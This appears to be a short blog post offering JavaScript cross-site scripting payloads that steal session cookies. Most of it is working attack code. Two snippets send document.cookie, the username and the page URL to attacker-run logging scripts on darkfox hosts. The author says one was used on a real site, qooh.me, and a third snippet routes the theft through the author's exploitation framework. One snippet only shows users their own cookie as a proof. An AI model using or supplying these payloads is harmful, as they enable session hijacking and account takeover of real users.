---
title: General cookie jacker
---

For a very tiny amount of code, one could very easily send a cookie to a log
script or send any information that they want from a user. Sending the user's
cookie across domains can be very useful for an attacker because if the server
manages cookies and sessions in a way that the cookie doesn't change, the
attacker has instantly become that user. If the service is changing the cookie,
this may be guessable as it's generally just an increment.

``` javascript
(x = new XMLHttpRequest || ActiveXObject("Microsoft.XMLHTTP"))
  .open("GET",
        "http://darkfox.hackerhaven.net/exploits/log.php?c="
          + escape(document.cookie), 1);
x.send();
```

Present the user with their cookie
==================================

The cookie doesn't need to be broadcasted to a server to show a fault and
serious security vulnerability. As I wouldn't want to steal people's sessions,
I would generally use the following to prove the cookie can be stolen by
presenting the user with their cookie.

``` javascript
document.querySelector("#cookie").textContent = document.cookie
```

Sending more than the cookie
============================

A cookie in it's self isn't always what you want to collect, you may also want
to collect information that is available to the user who is logged in. Below
I have an example which I used on <http://qooh.me> to get the username of the
user from the navigation.

``` {.javascript .showAll}
/* Fetch the username from the 2nd navigation list item. */
var u = document.querySelector("li:nth-child(2) a")
                .getAttribute("href")
                .slice(1), x;

/* Create and send the user's username, cookie and address of the page they are
 * visiting.
 */
(x = new XMLHttpRequest || ActiveXObject("Microsoft.XMLHTTP"))
    .open("post",
          "http://darkfox.us.to/exploits/log.php",
          1);

/* Because we are 'POST'ing the data in a urlencoded format, we need to tell
 * the server how to take out request correctly.
 */
x.setRequestHeader("Content-type",
                   "application/x-www-form-urlencoded");

/* I have a helper function here which encodes the object to a urlencoded
 * string.
 */
x.send((function(j){
    var a = [];
    for (var k in j)
      a.push(escape(k) + "=" + escape(j[k]));
    return a.join("&");
  })({ c: document.cookie
     , u: u.indexOf("user/") == 0 ? "user is a guest" : u
     , a: location.href
     }));
```

Using my DFEF.js
----------------

I have written a small framework to aid communication and improve the
readability of the code. This does however require my script to be pre-loaded.
For more information for the framework check out [DarkFox's Exploitation
Framework][DFEF].

``` javascript
var u = document.querySelector("li:nth-child(2) a")
                .getAttribute("href")
                .slice(1);

df.post("http://darkfox.us.to/exploits/log.php",
        { c: document.cookie
        , u: u.indexOf("user"/") == 0 ? "user is a guest" : u
        , a: location.href
        })
```

For more information on the <http://qooh.me> exploits, check out my [Pentest
report for qooh.me][Pentest-qooh.me]

 [Pentest-qooh.me]: /2013/06/01/qooh.me-pentest-report/
 [DFEF]:            /exploits/dfef/
